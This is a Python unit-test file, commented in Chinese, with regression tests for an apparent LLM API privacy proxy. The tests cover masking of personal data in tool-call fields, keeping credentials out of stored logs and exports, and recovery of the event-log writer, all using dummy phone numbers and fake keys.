"""审计修复回归测试（v1.5.19 起）。

覆盖外部审计报告的 P0/P1 验收点：
- P0-1 路径感知脱敏：业务字段（tool input 内）不再被字段名豁免，协议字段仍保留
- P0-2 凭据永不明文落库：MASK/RESTORE/SCAN_WARN items 无 original，带 sha256 摘要
- P0-3 导出脱敏：/api/logs/export 不含任何 original 明文
- P0-4 写线程韧性：DB 失败不死线程，恢复后自动续写
- P1-3 上游 target 路径前缀：保护态与透传态转发地址一致
- P1-4 响应扫描：无请求脱敏项时也扫描模型回复中的外部 PII
- P1-5 清空日志竞态：cutoff 前入队的事件不回写
"""
import ast
import json
import os
import re
import sqlite3
import tempfile
import threading
import time
import unittest
from contextlib import closing
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
import sys
sys.path.insert(0, str(ROOT / "engine"))
sys.path.insert(0, str(ROOT))

import panel
import transparent as tr
import event_store
import shield_defaults as sd
import audit_signals


def _reset_db(tmp_path):
    old = event_store.DB_PATH
    event_store.DB_PATH = tmp_path
    event_store._reset_writer()
    return old


class MaskPathAwarenessTests(unittest.TestCase):
    """P0-1：脱敏跳过必须按 JSON 路径判定，业务字段不豁免。"""

    def setUp(self):
        tr.sessions.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()
        tr.CUSTOM_WORDS.clear()
        tr.CUSTOM_WORDS.update({"张三": "NAME"})
        tr.SENSITIVE_DISABLED = set()
        tr.SENSITIVE_WORD_DISABLED = {}
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        tr._CUSTOM_WORD_RX_CACHE.clear()
        tr.SECRET_PREFIXES = ["sk-", "ah-"]
        tr.UPSTREAMS = list(tr.DEFAULT_UPSTREAMS)
        tr.CAPTURE_MODE = "reverse"

    def _flow(self, host, path, body, listen_port=None):
        client_conn = None
        if listen_port is not None:
            client_conn = SimpleNamespace(sockname=("127.0.0.1", listen_port))
        return SimpleNamespace(
            request=SimpleNamespace(
                pretty_host=host, path=path, method="POST",
                headers={"content-type": "application/json"},
                content=json.dumps(body, ensure_ascii=False).encode("utf-8"),
                host=host, port=5802, scheme="http",
            ),
            response=None, metadata={}, client_conn=client_conn,
        )

    def _with_no_reload(self, fn):
        old_reload, old_emit = tr._maybe_reload, tr._emit
        try:
            tr._maybe_reload = lambda force=False: None
            tr._emit = lambda *args, **kwargs: None
            return fn()
        finally:
            tr._maybe_reload, tr._emit = old_reload, old_emit

    def test_tool_input_business_fields_are_masked(self):
        """审计实测泄漏面：tool 参数里 input_name/input_url 曾原文直出，现在必须脱敏。"""
        def run():
            flow = self._flow("api.openai.com", "/v1/chat/completions", {
                "messages": [
                    {"role": "user", "content": "查一下"},
                    {"role": "assistant", "tool_calls": [
                        {"id": "call_1", "type": "function", "function": {
                            "name": "lookup",
                            "arguments": json.dumps({
                                "name": "张三",
                                "phone": "13812345678",
                                "url": "https://example.com/u/13812345678",
                            }, ensure_ascii=False),
                        }},
                    ]},
                ],
            }, listen_port=18701)
            tr.request(flow)
            sent = json.dumps(json.loads(flow.request.content), ensure_ascii=False)
            # 业务字段必须脱敏（含 URL 里的手机号）
            self.assertNotIn("张三", sent)
            self.assertNotIn("13812345678", sent)
            # 协议字段保持原样：工具名 + tool_call_id
            msgs = json.loads(flow.request.content)["messages"]
            self.assertEqual(msgs[1]["tool_calls"][0]["function"]["name"], "lookup")
            self.assertEqual(msgs[1]["tool_calls"][0]["id"], "call_1")
        self._with_no_reload(run)

    def test_tool_use_input_url_with_phone_inside_is_masked(self):
        """tool_use.input.url 里的手机号：URL 是业务数据不是媒体容器，必须脱敏。"""
        def run():
            flow = self._flow("anthropic.com", "/v1/messages", {
                "messages": [
                    {"role": "user", "content": "查询"},
                    {"role": "assistant", "content": [
                        {"type": "tool_use", "id": "tu_1", "name": "search",
                         "input": {"url": "https://example.com/u/13812345678", "name": "张三"}},
                    ]},
                ],
            }, listen_port=18703)
            tr.request(flow)
            sent = json.dumps(json.loads(flow.request.content), ensure_ascii=False)
            self.assertNotIn("13812345678", sent, "tool input 的 url 字段里的手机号必须脱敏")
            self.assertNotIn("张三", sent)
        self._with_no_reload(run)

    def test_media_url_and_base64_are_still_skipped(self):
        """图片消息的 url/data 是协议媒体数据，改了就破图，仍然跳过。"""
        def run():
            flow = self._flow("api.openai.com", "/v1/chat/completions", {
                "messages": [{"role": "user", "content": [
                    {"type": "image_url", "image_url": {"url": "https://img.example.com/a.png"}},
                ]}],
            }, listen_port=18701)
            tr.request(flow)
            got = json.loads(flow.request.content)
            self.assertEqual(got["messages"][0]["content"][0]["image_url"]["url"],
                             "https://img.example.com/a.png")
        self._with_no_reload(run)

    def test_tool_use_id_and_name_are_protocol(self):
        """Anthropic tool_use 的 id/name 是协议字段，客户端回显用，必须保留。"""
        def run():
            flow = self._flow("anthropic.com", "/v1/messages", {
                "messages": [{"role": "user", "content": "客户张三"}],
            }, listen_port=18703)
            tr.request(flow)
            sid = flow.metadata["session_id"]
            masked = json.loads(flow.request.content)["messages"][0]["content"]
            token = re.search(tr._PLACEHOLDER_RX, masked).group(0)
            flow.response = SimpleNamespace(
                headers={"content-type": "application/json"},
                status_code=200,
                content=json.dumps({"content": [
                    {"type": "tool_use", "id": "tu_1", "name": "search",
                     "input": {"query": token, "name": "张三"}},
                ]}, ensure_ascii=False).encode("utf-8"),
            )
            tr.response(flow)
            got = json.loads(flow.response.content)
            self.assertEqual(got["content"][0]["id"], "tu_1")
            self.assertEqual(got["content"][0]["name"], "search")
            # 还原后 input.name 里的原文完整回来（说明上行确实脱敏了）
            self.assertEqual(got["content"][0]["input"]["name"], "张三")
        self._with_no_reload(run)

    def test_business_zone_type_role_model_are_masked(self):
        """审计 SHIELD-MASK-001：input 里的 type/role/model 是业务数据，必须脱敏。"""
        def run():
            flow = self._flow("anthropic.com", "/v1/messages", {
                "messages": [
                    {"role": "user", "content": "查询"},
                    {"role": "assistant", "content": [
                        {"type": "tool_use", "id": "tu_1", "name": "search",
                         "input": {
                             "type": "13812345678",
                             "role": "13900001111",
                             "model": "13612345678",
                             "id": "13712345678",
                             "url": "https://example.com/u/13512345678",
                             "data": "13812345679",
                         }},
                    ]},
                ],
            }, listen_port=18703)
            tr.request(flow)
            sent = json.dumps(json.loads(flow.request.content), ensure_ascii=False)
            for phone in ("13812345678", "13900001111", "13612345678", "13712345678", "13512345678", "13812345679"):
                self.assertNotIn(phone, sent, f"input.{['type','role','model','id','url','data'][['13812345678','13900001111','13612345678','13712345678','13512345678','13812345679'].index(phone)]} 里的号码必须脱敏")
            # 协议位置保留：tool_use 的 id/name
            got = json.loads(flow.request.content)["messages"][1]["content"][0]
            self.assertEqual(got["id"], "tu_1")
            self.assertEqual(got["name"], "search")
        self._with_no_reload(run)

    def test_custom_business_id_and_type_outside_business_zone_are_masked(self):
        """审计验收点：任意 customer.id、自定义对象里的 type 也要脱敏。"""
        def run():
            flow = self._flow("api.openai.com", "/v1/chat/completions", {
                "messages": [{"role": "user", "content": "查一下"}],
                "customer": {"id": "11010519491231002X", "type": "13812345678"},
            }, listen_port=18701)
            tr.request(flow)
            got = json.loads(flow.request.content)
            # 身份证号（GB 11643 校验位合法）→ 脱敏；type 里的手机号 → 脱敏
            self.assertNotIn("11010519491231002X", json.dumps(got, ensure_ascii=False))
            self.assertNotIn("13812345678", json.dumps(got, ensure_ascii=False))
        self._with_no_reload(run)

    def test_protocol_role_type_model_still_preserved(self):
        """协议位置保留：messages[].role、content[].type、顶层 model 不脱敏。"""
        def run():
            flow = self._flow("api.openai.com", "/v1/chat/completions", {
                "model": "gpt-4o-mini",
                "messages": [
                    {"role": "user", "content": "电话13812345678"},
                    {"role": "assistant", "content": [{"type": "text", "text": "好的"}]},
                ],
            }, listen_port=18701)
            tr.request(flow)
            got = json.loads(flow.request.content)
            self.assertEqual(got["model"], "gpt-4o-mini")
            self.assertEqual(got["messages"][0]["role"], "user")
            self.assertEqual(got["messages"][1]["role"], "assistant")
            self.assertEqual(got["messages"][1]["content"][0]["type"], "text")
            # 业务文本照常脱敏
            self.assertNotIn("13812345678", json.dumps(got, ensure_ascii=False))
        self._with_no_reload(run)

    def test_legacy_functions_and_gemini_tool_names_are_preserved(self):
        """旧式 functions[].name 与 Gemini functionCall.name 是工具分发标识，不能脱敏；
        但 description 等业务文本照常扫描。"""
        def run():
            flow = self._flow("api.openai.com", "/v1/chat/completions", {
                "functions": [{"name": "get_weather", "description": "查询张三的天气"}],
                "messages": [{"role": "user", "content": "查天气"}],
            }, listen_port=18701)
            tr.request(flow)
            got = json.loads(flow.request.content)
            self.assertEqual(got["functions"][0]["name"], "get_weather")
            self.assertNotIn("张三", got["functions"][0]["description"], "description 业务文本应脱敏")
        self._with_no_reload(run)

    def test_deep_json_fails_closed_not_silent_passthrough(self):
        """深度超限不能再静默原文放行：fail-closed 下阻断（审计要求）。"""
        def run():
            old = tr.FAIL_CLOSED
            try:
                tr.FAIL_CLOSED = True
                node = {"v": "机密原文"}
                for _ in range(30):  # 对象嵌套深度远超 24
                    node = {"n": node}
                body = {"messages": [{"role": "user", "content": node}]}
                flow = self._flow("api.openai.com", "/v1/chat/completions", body, listen_port=18701)
                tr.request(flow)
                self.assertIsNotNone(flow.response, "深度超限必须阻断")
                self.assertEqual(flow.response.status_code, 503)
                self.assertIn(b"shield_mask_failed", flow.response.content)
            finally:
                tr.FAIL_CLOSED = old
        self._with_no_reload(run)


class CredentialRedactionTests(unittest.TestCase):
    """P0-2：凭据永不明文落库。"""

    def setUp(self):
        tr.sessions.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()
        tr.CUSTOM_WORDS.clear()
        tr.SENSITIVE_DISABLED = set()
        tr.SENSITIVE_WORD_DISABLED = {}
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        tr.SECRET_PREFIXES = ["sk-", "ah-"]
        tr.UPSTREAMS = list(tr.DEFAULT_UPSTREAMS)
        tr.CAPTURE_MODE = "reverse"

    def _capture(self, fn):
        captured = []
        old_emit, old_reload = tr._emit, tr._maybe_reload
        try:
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            tr._maybe_reload = lambda force=False: None
            fn()
        finally:
            tr._emit, tr._maybe_reload = old_emit, old_reload
        return captured

    def _flow(self, host, path, body):
        client_conn = SimpleNamespace(sockname=("127.0.0.1", 18701))
        return SimpleNamespace(
            request=SimpleNamespace(
                pretty_host=host, path=path, method="POST",
                headers={"content-type": "application/json"},
                content=json.dumps(body, ensure_ascii=False).encode("utf-8"),
                host=host, port=5802, scheme="http",
            ),
            response=None, metadata={}, client_conn=client_conn,
        )

    def test_mask_event_credential_items_have_no_original(self):
        captured = self._capture(lambda: tr.request(self._flow(
            "api.openai.com", "/v1/chat/completions",
            {"messages": [{"role": "user", "content": "key=sk-1234567890abcdefghijklmnopqrst"}]})))
        mask = [kw for typ, kw in captured if typ == "MASK"][0]
        items = mask["items"]
        self.assertTrue(items, "应有凭据命中项")
        for it in items:
            if it["label"] in tr.CREDENTIAL_LABELS:
                self.assertNotIn("original", it, "凭据类 items 不得携带明文")
                self.assertTrue(it.get("cred"))
                self.assertTrue(re.fullmatch(r"[0-9a-f]{16}", it.get("digest", "")),
                                "凭据应带 sha256 摘要")
                # 预览分档后不再是固定的 ****，守的是「中段不出现 + 不等于原文」
                self.assertNotIn("sk-1234567890abcdefghijklmnopqrst", str(it.get("preview")))

    def test_restore_event_credential_items_have_no_original(self):
        def run():
            flow = self._flow("api.openai.com", "/v1/chat/completions",
                              {"messages": [{"role": "user", "content": "key=sk-1234567890abcdefghijklmnopqrst"}]})
            tr.request(flow)
            masked = json.loads(flow.request.content)["messages"][0]["content"]
            flow.response = SimpleNamespace(
                headers={"content-type": "application/json"},
                status_code=200,
                content=json.dumps({"choices": [{"message": {"content": "收到 " + masked}}]},
                                   ensure_ascii=False).encode("utf-8"),
            )
            tr.response(flow)
        captured = self._capture(run)
        restore = [kw for typ, kw in captured if typ == "RESTORE"][0]
        self.assertTrue(restore["items"], "RESTORE 应有明细")
        for it in restore["items"]:
            if it["label"] in tr.CREDENTIAL_LABELS:
                self.assertNotIn("original", it)
                self.assertTrue(it.get("cred"))
        # 还原后的对话文本（dialog）也不得含凭据明文
        self.assertNotIn("sk-1234567890abcdefghijklmnopqrst", restore.get("dialog") or "")
        self.assertNotIn("sk-1234567890abcdefghijklmnopqrst", restore.get("resp_preview") or "")

    def test_restore_scrubs_cross_session_restored_credential_plaintext_from_dialog(self):
        """跨请求经 _RECENT_REV 还原的历史凭据，若模型复述了凭据明文，也必须在 dialog/resp_preview 中被精确清洗。"""
        # 请求 1：脱敏连接串密码并签发占位符
        connstr = "postgres://usr:Zq9xLm2pTv8w@db.internal:5432/prod"
        f1 = self._flow("api.openai.com", "/v1/chat/completions",
                        {"messages": [{"role": "user", "content": "connect " + connstr}]})
        tr.request(f1)
        m1 = json.loads(f1.request.content)["messages"][0]["content"]
        token_match = re.search(r"\{\{CONNSTR_[A-Za-z0-9]+\}\}", m1)
        self.assertIsNotNone(token_match, "应成功提取连接串占位符")
        tok = token_match.group(0)

        # 请求 2：新会话未传任何凭据，但模型回答带上了请求 1 的占位符，且复述了密码明文
        def run_f2():
            f2 = self._flow("api.openai.com", "/v1/chat/completions",
                            {"messages": [{"role": "user", "content": "hello"}]})
            tr.request(f2)
            f2.response = SimpleNamespace(
                headers={"content-type": "application/json"},
                status_code=200,
                content=json.dumps({"choices": [{"message": {"content": f"配置完成: {tok} 密码为 Zq9xLm2pTv8w"}}]},
                                   ensure_ascii=False).encode("utf-8"),
            )
            tr.response(f2)

        captured = self._capture(run_f2)
        restore2 = [kw for typ, kw in captured if typ == "RESTORE"][0]
        # dialog 与 resp_preview 必须已被清洗掉明文密码
        self.assertNotIn(connstr, restore2.get("dialog") or "")
        self.assertNotIn(connstr, restore2.get("resp_preview") or "")

    def test_non_credential_pii_keeps_original_for_detail_dialog(self):
        """非凭据 PII 仍保留 original（项目约定：明文只进详情弹窗）。"""
        captured = self._capture(lambda: tr.request(self._flow(
            "api.openai.com", "/v1/chat/completions",
            {"messages": [{"role": "user", "content": "电话13812345678"}]})))
        mask = [kw for typ, kw in captured if typ == "MASK"][0]
        phone = [it for it in mask["items"] if it["label"] == "PHONE"]
        self.assertTrue(phone)
        self.assertEqual(phone[0]["original"], "13812345678")

    def test_scan_warn_credential_item_has_no_original(self):
        captured = []
        old_emit = tr._emit
        try:
            tr._emit = lambda typ, **kw: captured.append((typ, kw))
            old = tr.RESPONSE_SCAN
            tr.RESPONSE_SCAN = True
            try:
                sid = "scan-cred"
                tr._new_session(sid)
                flow = SimpleNamespace(
                    request=SimpleNamespace(host="api.openai.com", method="POST", path="/v1/chat/completions"),
                    response=SimpleNamespace(
                        headers={"content-type": "application/json"},
                        content=json.dumps({"choices": [{"message": {"content": "泄漏 sk-abcdefghijklmnopqrstuvwxyz012345"}}]}).encode("utf-8"),
                    ),
                    metadata={"session_id": sid},
                )
                tr._scan_response(flow, sid, "api.openai.com", "POST", "/v1/chat/completions", {})
            finally:
                tr.RESPONSE_SCAN = old
        finally:
            tr._emit = old_emit
        warns = [kw for typ, kw in captured if typ == "SCAN_WARN"]
        self.assertTrue(warns, "凭据出现在模型回复里必须出 SCAN_WARN")
        for it in warns[0]["items"]:
            self.assertNotIn("original", it, "响应侧扫描的凭据也不得落明文")
            pv = str(it.get("preview") or "")
            self.assertNotIn("1234567890abcdefghijklmnop", pv, "预览不得含凭据中段")

    def test_redact_credentials_helper(self):
        out = tr._redact_credentials(
            "token sk-abcdefghijklmnopqrstuvwxyz012345 password=P@ssw0rd12345"
        )
        self.assertNotIn("sk-abcdefghijklmnopqrstuvwxyz012345", out)
        self.assertNotIn("P@ssw0rd12345", out)
        self.assertIn("[REDACTED]", out)


class ExportRedactionTests(unittest.TestCase):
    """P0-3：日志导出恒脱敏。"""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())
        self.old_db = event_store.DB_PATH
        event_store.DB_PATH = self.tmpdir / "ev.sqlite3"
        event_store._reset_writer()
        event_store.init_db()

    def tearDown(self):
        event_store._reset_writer()
        event_store.DB_PATH = self.old_db
        for p in [self.tmpdir / "ev.sqlite3", self.tmpdir / "ev.sqlite3-wal", self.tmpdir / "ev.sqlite3-shm"]:
            try:
                p.unlink(missing_ok=True)
            except Exception:
                pass

    def test_export_contains_no_original_anywhere(self):
        event_store.append_event({
            "ts": time.time(), "type": "MASK", "count": 2, "host": "api.openai.com",
            "method": "POST", "path": "/v1/chat/completions",
            "items": [
                {"label": "PHONE", "original": "13812345678", "preview": "138****5678", "length": 11},
                {"label": "API_KEY", "preview": "****", "digest": "a" * 16, "length": 48, "cred": True},
            ],
            "dialog": "【用户】\n电话{{PHONE_abcdef}}",
        })
        with panel.app.test_client() as client:
            resp = client.get("/api/logs/export", headers={"X-Shield-Token": panel.API_TOKEN})
        self.assertEqual(resp.status_code, 200)
        data = json.loads(resp.data.decode("utf-8"))
        self.assertTrue(data.get("masked_export"))
        blob = json.dumps(data, ensure_ascii=False)
        self.assertNotIn("original", blob, "导出不得携带 original 字段")
        self.assertNotIn("13812345678", blob, "导出不得包含任何原文")
        # 凭据项的打码 preview 与摘要保留（可对照同一性，无明文）
        self.assertIn('"digest": "aaaaaaaaaaaaaaaa"', blob)


class WriterResilienceTests(unittest.TestCase):
    """P0-4：写线程遇到 DB 故障不死、恢复后自动续写。"""

    def setUp(self):
        self.tmpdir = Path(tempfile.mkdtemp())
        self.old_db = event_store.DB_PATH
        event_store.DB_PATH = self.tmpdir / "ev.sqlite3"
        event_store._reset_writer()
        event_store.init_db()

    def tearDown(self):
        event_store._reset_writer()
        event_store.DB_PATH = self.old_db
        for p in [self.tmpdir / "ev.sqlite3", self.tmpdir / "ev.sqlite3-wal", self.tmpdir / "ev.sqlite3-shm"]:
            try:
                p.unlink(missing_ok=True)
            except Exception:
                pass

    def test_writer_survives_db_failure_and_recovers(self):
        # 1. 把 DB 指向打不开的路径（父目录不存在）→ 写失败
        event_store.DB_PATH = self.tmpdir / "no_such_dir" / "ev.sqlite3"
        event_store._reset_writer()
        event_store.enqueue_event({"ts": time.time(), "type": "MASK", "count": 1, "host": "a"})
        event_store.flush_event_queue()
        stats = event_store.writer_stats()
        self.assertTrue(stats["event_writer_alive"], "DB 写失败后写线程必须存活")
        self.assertGreaterEqual(stats["event_writer"]["dead_letters"], 1)
        # 2. 恢复 DB 路径 → 后续事件自动续写
        event_store.DB_PATH = self.tmpdir / "ev.sqlite3"
        event_store._reset_writer()
        event_store.enqueue_event({"ts": time.time(), "type": "MASK", "count": 1, "host": "b"})
        event_store.flush_event_queue()
        evs = event_store.fetch_events(limit=50)
        self.assertTrue(any(e.get("host") == "b" for e in evs), "DB 恢复后事件必须能续写")

    def test_export_strips_restore_dialog_plaintext(self):
        """审计 SHIELD-EXPORT-001：RESTORE 事件的 dialog/resp_preview 是还原后正文，
        导出必须剔除（曾只删 items[].original，电话仍经回复摘要外泄）。"""
        event_store.append_event({
            "ts": time.time(), "type": "RESTORE", "restored": 1, "status": "restored",
            "host": "api.openai.com", "method": "POST", "path": "/v1/chat/completions",
            "items": [{"label": "PHONE", "original": "13812345678", "preview": "138****5678", "length": 11}],
            "dialog": "【助手】\n你的电话是13812345678，已记录",
            "resp_preview": "你的电话是13812345678",
            "req_preview": "电话{{PHONE_abcdef}}",
        })
        with panel.app.test_client() as client:
            resp = client.get("/api/logs/export", headers={"X-Shield-Token": panel.API_TOKEN})
        self.assertEqual(resp.status_code, 200)
        blob = resp.data.decode("utf-8")
        self.assertNotIn("13812345678", blob, "导出不得含还原正文明文")
        self.assertNotIn("dialog", blob)
        self.assertNotIn("resp_preview", blob)
        self.assertNotIn("req_preview", blob)
        # 元数据保留：类型/状态/计数/打码 items
        data = json.loads(blob)
        self.assertEqual(data["events"][0]["type"], "RESTORE")
        self.assertEqual(data["events"][0]["status"], "restored")
        self.assertEqual(data["events"][0]["items"][0]["preview"], "138****5678")

    def test_stream_actual_reaches_list_and_export(self):
        """stream_actual（引擎实际处理方式）必须能到前端：列表 slim 不剔除、导出白名单保留。

        客户端请求流式（stream_mode=stream）但上游在接管黑名单或返回压缩体时，引擎
        只能整包下发（stream_actual=whole），此时面板若只显示 stream_mode 就会显示
        「流式」而客户端实际卡整段，故障无从归因（实测 opencode.ai 2798 次全部退化）。
        """
        event_store.append_event({
            "ts": time.time(), "type": "RESTORE", "restored": 0, "status": "no_sensitive_data",
            "host": "opencode.ai", "method": "POST", "path": "/zen/go/v1/chat/completions",
            "stream_mode": "stream", "stream_actual": "whole",
            "dialog": "【助手】示例回复",
        })
        with panel.app.test_client() as client:
            hdr = {"X-Shield-Token": panel.API_TOKEN}
            slim = client.get("/api/logs?slim=1&limit=50", headers=hdr)
            exported = client.get("/api/logs/export", headers=hdr)
        self.assertEqual(slim.status_code, 200)
        ev = [e for e in slim.get_json()["events"] if e.get("host") == "opencode.ai"]
        self.assertTrue(ev, "列表必须能取到该事件")
        self.assertEqual(ev[0].get("stream_mode"), "stream")
        self.assertEqual(ev[0].get("stream_actual"), "whole",
                         "slim 不得剔除 stream_actual，否则前端无法区分真流式与整包退化")
        self.assertEqual(exported.status_code, 200)
        exp = [e for e in exported.get_json()["events"] if e.get("host") == "opencode.ai"]
        self.assertEqual(exp[0].get("stream_actual"), "whole", "导出白名单须保留 stream_actual")
        # 正文仍须剔除（不因新增字段放宽导出口径）
        self.assertNotIn("dialog", exported.data.decode("utf-8"))

    def test_fetch_restore_items_returns_successful_values_safely(self):
        """首页还原明细只收成功 RESTORE，普通 PII 可反查，凭据永不返回 original。"""
        now = time.time()
        event_store.append_event({
            "ts": now, "type": "RESTORE", "restored": 3, "status": "restored",
            "restore_status": "restored",
            "items": [
                {"label": "PERSON", "original": "张三", "preview": "张*", "length": 2, "restored": True},
                {"label": "PERSON", "original": "张三", "preview": "张*", "length": 2, "restored": True},
                {"label": "API_KEY", "original": "sk-live-secret", "preview": "****", "length": 14, "cred": True, "restored": True},
            ],
        })
        event_store.append_event({
            "ts": now, "type": "RESTORE", "restored": 1, "status": "unresolved",
            "items": [{"label": "EMAIL", "original": "a@example.com", "preview": "a***@example.com", "restored": True}],
        })
        data = event_store.fetch_restore_items(now=now)
        self.assertTrue(data["ok"])
        self.assertEqual(data["total_events"], 1)
        self.assertEqual(data["restored_count"], 3)
        self.assertEqual(len(data["items"]), 2)
        person = next(it for it in data["items"] if it["label"] == "PERSON")
        self.assertEqual(person["original"], "张三")
        self.assertEqual(person["events"], 1, "同一事件内重复占位符只算一次")
        cred = next(it for it in data["items"] if it["label"] == "API_KEY")
        self.assertNotIn("original", cred)
        self.assertEqual(cred["preview"], "****")

    def test_fetch_restore_items_rejects_placeholder_originals(self):
        """历史 RESTORE 明细的 original 可能是占位符本身（跨请求复述），不得展示。"""
        now = time.time()
        # 占位符样例用拼接构造，避免工具层把 {{LABEL_hex6}} 当模板展开
        ph1 = "{" * 2 + "IPPRIVATE_dc29fe" + "}" * 2
        ph2 = "{" * 2 + "IPPRIVATE_c782cc" + "}" * 2
        self.assertTrue(event_store._PLACEHOLDER_RE.match(ph1))
        event_store.append_event({
            "ts": now, "type": "RESTORE", "restored": 2, "status": "restored",
            "restore_status": "restored",
            "items": [
                {"label": "IP_PRIVATE", "original": ph1,
                 "preview": "19**80", "length": 13, "restored": True},
                {"label": "IP_PRIVATE", "original": ph2,
                 "preview": "192****5", "length": 11, "restored": True},
            ],
        })
        data = event_store.fetch_restore_items(now=now)
        self.assertEqual(data["total_events"], 1)
        self.assertEqual(data["restored_count"], 2)
        # 占位符原文一律回退为打码 preview，接口不返回任何占位符文本
        for it in data["items"]:
            self.assertNotIn("original", it)
            self.assertNotIn("{{", str(it))
        self.assertEqual(len(data["items"]), 2, "不同打码预览分别聚合，不与真实明文合并")

    def test_clear_events_also_clears_summary_tables(self):
        """SHIELD-CLEAR-001 更新（用户要求：统计永久保存）：清空日志清事件明细
        + daily_words（词级 PII 明细），但 daily_stats/daily_status/daily_tokens
        纯数字统计永久保留。"""
        now = time.time()
        event_store.append_event({"ts": now, "type": "MASK", "count": 2, "host": "a",
                                  "items": [{"label": "PHONE", "original": "13812345678", "preview": "138****5678"}]})
        event_store.append_event({"ts": now, "type": "RESTORE", "restored": 1, "status": "restored"})
        st = event_store.today_stats(now=now)
        self.assertEqual(st["mask_events"], 1)
        self.assertEqual(st["by_label"].get("PHONE"), 1)
        r = event_store.clear_events()
        self.assertTrue(r["ok"])
        st2 = event_store.today_stats(now=now)
        # 统计保留（用户要求）：mask_events 不清零
        self.assertEqual(st2["mask_events"], 1, "清空日志后统计应保留")
        # daily_words 已清（词级 PII 明细）
        self.assertEqual(st2["by_label"], {})
        self.assertEqual(st2["top_words"], [])

    def test_daily_words_only_from_mask_not_restore(self):
        """审计 DATA-001：daily_words 只收 MASK 事件，RESTORE 重复明细不得双计。"""
        now = time.time()
        item = {"label": "PHONE", "original": "13812345678", "preview": "138****5678", "length": 11}
        event_store.append_event({"ts": now, "type": "MASK", "count": 1, "items": [item]})
        event_store.append_event({"ts": now, "type": "RESTORE", "restored": 1, "items": [item]})
        st = event_store.today_stats(now=now)
        self.assertEqual(st["by_label"].get("PHONE"), 1, "MASK+RESTORE 同明细只计一次")

    def test_today_stats_backfills_legacy_events_on_upgrade(self):
        """审计 DATA-002：摘要表上线后，升级前写入的事件必须回填（迁移标记幂等）。"""
        # 「今天早些时候（升级前）」：不能直接写 now-3600——本地时间 00:00-01:00
        # 之间跑，now-3600 会落到昨天，摘要按天分桶就查不到，该用例必挂（实测
        # 00:17 挂、01:05 过）。钳进当天，且必须早于 daily_stats_created
        # （setUp 时写入）才会进回填区间。
        now0 = time.time()
        old_ts = max(event_store._day_start(now0) + 1.0, now0 - 3600)
        event_store.append_event({"ts": old_ts, "type": "MASK", "count": 3, "host": "old",
                                  "items": [{"label": "EMAIL", "original": "old@ex.com", "preview": "o****m"}]})
        # 手工清除摘要 + 迁移标记（模拟升级后首次启动）
        # 必须套 closing()：sqlite3.Connection 的 with 是「事务」上下文管理器，
        # 只提交/回滚，不关连接——直接 `with _connect() as conn` 会漏一个连接，
        # 表现为跑完单测一条 ResourceWarning: unclosed database。
        with closing(event_store._connect()) as conn:
            conn.execute("DELETE FROM daily_stats")
            conn.execute("DELETE FROM daily_words")
            conn.execute("DELETE FROM meta WHERE key='daily_stats_migrated'")
            conn.commit()
        st = event_store.today_stats(now=now0)
        self.assertEqual(st["mask_events"], 1, "升级前的事件必须回填进摘要")
        self.assertEqual(st["masked_items"], 3)
        self.assertEqual(st["by_label"].get("EMAIL"), 1)
        # 幂等：再调一次不翻倍
        st2 = event_store.today_stats(now=now0)
        self.assertEqual(st2["mask_events"], 1)
        self.assertEqual(st2["masked_items"], 3)
        # 跨天边界：migrated 已标记后，第二天不得再次回填（曾按「今天零点」判断，
        # 每天都会重复回填已统计事件，ON CONFLICT cnt+1 翻倍）
        st3 = event_store.today_stats(now=now0 + 86400 * 2)
        self.assertEqual(st3["masked_items"], 0, "跨天后不应重复回填历史事件")
        self.assertGreaterEqual(st3["mask_events"], 0)

    def test_audit_writer_counts_failures_when_db_unwritable(self):
        """审计 AUDIT-001：DB 不可写时审计写线程必须记 dead_letters（曾恒为 0 静默丢失）。"""
        old_db = event_store.DB_PATH
        try:
            event_store.DB_PATH = self.tmpdir / "no_such_dir" / "audit.sqlite3"
            event_store._reset_writer()
            event_store.enqueue_audit_event({"ts": time.time(), "signal_type": "test", "severity": "LOW"})
            event_store.flush_audit_queue()
            stats = event_store.writer_stats()
            self.assertGreaterEqual(stats["audit_writer"]["dead_letters"], 1,
                                    "审计写入失败必须计数")
            self.assertTrue(stats["audit_writer_alive"])
        finally:
            event_store._reset_writer()
            event_store.DB_PATH = old_db

    def test_audit_stats_hide_deprecated_noise(self):
        """统计页与审计列表使用同一读侧过滤，旧误报不能继续计入趋势。"""
        now = time.time()
        event_store.append_audit_event({
            "ts": now, "signal_type": "error_leak", "severity": "MEDIUM",
            "evidence": "upstream_host: relay.example",
        })
        event_store.append_audit_event({
            "ts": now, "signal_type": "error_leak", "severity": "HIGH",
            "evidence": "google_api_key len=39 sha256=0123456789abcdef",
        })
        history = event_store.stats_history(days=1)
        self.assertEqual(sum(row["audit_signals"] for row in history["data"]), 1)

    def test_fetch_audit_hides_deprecated_noise_without_deleting_history(self):
        """读侧隐藏已撤销的告警判据，避免升级后旧记录继续污染安全审计。"""
        now = time.time()
        event_store.append_audit_event({
            "ts": now, "signal_type": "error_leak", "severity": "MEDIUM",
            "evidence": "upstream_host: relay.example",
        })
        event_store.append_audit_event({
            "ts": now, "signal_type": "canary_leak", "severity": "HIGH",
            "evidence": "canary_echoed: CANARY_demo",
        })
        event_store.append_audit_event({
            "ts": now, "signal_type": "error_leak", "severity": "CRITICAL",
            "evidence": "sk_prefix_secret len=35 sha256=0123456789abcdef",
        })
        event_store.append_audit_event({
            "ts": now, "signal_type": "identity_swap", "severity": "HIGH",
            "evidence": "",
        })
        visible = event_store.fetch_audit_events(limit=20)
        evidence = {e["evidence"] for e in visible}
        signals = {(e["signal_type"], e["evidence"]) for e in visible}
        self.assertNotIn("upstream_host: relay.example", evidence)
        self.assertNotIn("canary_echoed: CANARY_demo", evidence)
        self.assertIn("sk_prefix_secret len=35 sha256=0123456789abcdef", evidence)
        self.assertIn(("identity_swap", ""), signals, "空 evidence 的有效历史事件不得被过滤")

    def test_clear_audit_events_race_old_queue_events_do_not_resurface(self):
        """审计 SHIELD-CLEAR-001：清空审计后，cutoff 前入队的旧事件不回写。"""
